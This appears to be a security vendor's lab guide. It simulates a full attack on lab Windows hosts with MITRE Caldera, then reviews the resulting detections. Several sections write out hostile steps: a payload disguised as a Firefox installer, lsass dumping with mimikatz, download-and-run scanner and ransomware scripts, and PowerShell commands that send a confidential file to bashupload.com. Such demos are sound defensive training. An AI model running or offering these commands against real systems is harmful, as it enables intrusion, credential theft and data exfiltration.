---
title: "Windows"
chapter: false
weight: 41
pre: "<b>4.1 </b>"
---
### ATT&CK Phases
#### Reconnaissance
This step was skipped because we already know the target of our attack (EC2 Instances - Windows Target 1 and Windows Target 2)

---
#### Resource Development
We are using Caldera as one of the tools to help us evaluate how Vision One could help companies to improve their security posture and risk management.

CALDERA™ is a cybersecurity framework developed by MITRE that empowers cyber practitioners to save time, money, and energy through automated security assessments.

<b>Mitre Caldera - Pre-Configuration</b>

Before starting the attack simulation, update the Mitre Caldera Global Configurations. You must replace the IP Address (0.0.0.0) with the Public IP Address you use to access the Mitre Caldera management console.

<b>Instructions:</b>
{{< youtube id="9X5A4A54ZHI" >}}

---
#### Initial Access and Execution
In this step, you will create a malicious payload (Windows Based). Then you will pack it into an executable file (that simulates the Mozilla Firefox Installation) and upload it to filebin.net. 

The output URL will be used to drop this 0-day malware to the target Windows Computer.

Use the website https://ps2exe.azurewebsites.net/ to create the EXE file. Make sure that on top of the Caldera script (Powershell), you also add the following payload (That is used to install Mozilla Firefox). 

<b>Windows Payload - Add the following code on top of the Caldera Payload</b>

Invoke-WebRequest -Uri "https://download.mozilla.org/?product=firefox-51.0.1-SSL&os=win64&lang=en-US" -OutFile c:\firefox.exe;
Start-Process -FilePath c:\firefox.exe -Args "/s" -Verb RunAs -Wait;

<b>After you export the file, upload it to filebin.net and take a note of the output url.</b>

References:

- PS1toEXE - https://ps2exe.azurewebsites.net/
- Online Storage - https://filebin.net/

<b>Instructions:</b>

Note: Download and execute the 0-day malware you created on the Windows Target 1 Instance.

{{< youtube id="Fvo7lh-mYDA" >}}

---
#### Persistence
Using Mitre Caldera, you can deploy additional backdoors that will ensure you can keep accessing the affected computers in the future:

In our case, we can run a remote instruction on the affected Linux computer and deploy a secondary agent (bot).

<b>Instructions:</b>
{{< youtube id="tZk7Xs7n7tE" >}}

---
#### Privilege Escalation
Using Mitre Caldera, you can deploy the Technique "UAC bypass registry (T1548.002)".

<b>Instructions:</b>
{{< youtube id="ehafYxLNmoI" >}}

---
#### Defense Evasion
Using Mitre Caldera, you can deploy the Technique "Disable Windows Defender All (T1562.001) - Disable Windows Defender All".

<b>Instructions:</b>
{{< youtube id="-YbaI1s7v2s" >}}

---
#### Credential Access
Using Mitre Caldera, you can deploy the Technique "Leverage Procdump for lsass memory (T1003.001) - Dump lsass for later use with mimikatz", followed by "PowerShell Invoke MimiKats" and "Powerkatz (Staged)". You may find sensitive information with this technique.

<b>Instructions:</b>
{{< youtube id="gwi4jE8BLUk" >}}

---
#### Discovery
Using Mitre Caldera, you can deploy the Technique "Collect ARP details (T1018)" and "Find System Network Connections (T1049)".

As result of the previous command, you will find active connections on the network 10.0.10.*. With this information, you can execute the following commands to find other active hosts running on the same subnet.

- Invoke-WebRequest -Uri https://raw.githubusercontent.com/BornToBeRoot/PowerShell_IPv4NetworkScanner/main/Scripts/IPv4NetworkScan.ps1 -OutFile C:\Users\Public\IPv4NetworkScan.ps1;
- powershell C:\Users\Public\IPv4NetworkScan.ps1 -IPv4Address 10.0.10.0 -Mask 255.255.255.0 -DisableDNSResolving;
- foreach ($port in 444..3390) {If (($a=Test-NetConnection 10.0.10.12 -Port $port -WarningAction SilentlyContinue).tcpTestSucceeded -eq $true){ "TCP port $port is open!"}}

<b>Instructions:</b>
{{< youtube id="CWmCC_bjaWA" >}}

---
#### Lateral Movement
As a next step of this demo, we are going to do lateral movement and exfiltrate sensitive data from the 10.0.10.12 host.

Using the Potential Links, select the technique "View remote shares (T1135)", and update it with the 10.0.10.12 IP Address.

<b>Instructions:</b>
{{< youtube id="lErMomcmH_0" >}}

---
#### Command & Control
You can skip this phase, the target computer is already being controlled by the attacker/c&c server.

---
#### Collection
Using Mitre Caldera, you can deploy the Technique "Find files (T1005) - Locate files deemed sensitive". Using this technique you can search for sensitive date hosted on the affected computers.

<b>Replace the original directory with c:\confidential, and the content of the folder with *.txt.</b>

After you located the sensitive files, check the content of the file "confidential.txt".

Then using the Manual Command option, select the CMD interpreter, and execute the following command:
- CMD - type c:\confidential\confidential.txt

<b>Instructions:</b>
{{< youtube id="BYGdESV0F7A" >}}

---
#### Exfiltration
Now its time to exfiltrate the sensitive data we found on the confidential directory. 
Use the following powershell commands to exfiltrate the data to the bashupload website.

- Invoke-WebRequest -Uri https://bashupload.com/ -Method Post -ContentType multipart/form-data  -Body c:\confidential\confidential.txt
- Invoke-RestMethod -Uri https://bashupload.com/ -Method Post -InFile c:\confidential\confidential.txt -UseDefaultCredentials

<b>Instructions:</b>
{{< youtube id="TNuvzg40CEE" >}}

---
#### Impact 1 - (Fake) Ransomware
Now its time to encrypt the affected servers (Windows Target 1).
After having the Risk Control Rule in place, you can execute the following commands.

- PS1 - powershell.exe -command Invoke-WebRequest -Uri https://github.com/andrefernandes86/demo-v1-ransomware/raw/main/download.ps1 -OutFile C:\Users\Public\Ransom.ps1;

- PS1 - powershell.exe -command C:\Users\Public\Ransom.ps1;

<b>Instructions:</b>
{{< youtube id="Jisl28z33U4" >}}

---
## Reviewing the Detections 
Review the Vision One Portal (Risk Insights and XDR / Workbenchs and OAT) searching for the evidences of the instructions executed during this demo.

{{< youtube id="7Y8AkK-M2js" >}}
